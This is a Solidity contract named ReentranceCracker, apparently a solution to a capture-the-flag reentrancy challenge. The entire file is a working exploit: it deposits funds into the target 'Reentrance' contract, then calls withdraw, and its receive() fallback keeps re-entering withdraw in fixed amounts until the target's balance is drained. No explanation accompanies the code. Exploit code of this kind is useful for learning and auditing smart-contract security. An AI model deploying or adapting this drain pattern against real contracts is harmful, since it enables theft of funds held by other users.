// SPDX-License-Identifier: MIT

pragma solidity >=0.4.22 <0.9.0;
import "../Challenge/Reentrance.sol";

contract ReentranceCracker {
    Reentrance reentrance;

    constructor(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function sendFunds() public payable {
        reentrance.donate{value: msg.value}(address(this));
    }

    function removeFunds(uint256 _amount) public {
        reentrance.withdraw(_amount);
    }

    receive() external payable {
        if (address(reentrance).balance >= 1000000000000000 wei) {
            reentrance.withdraw(1000000000000000 wei);
        }
    }
}
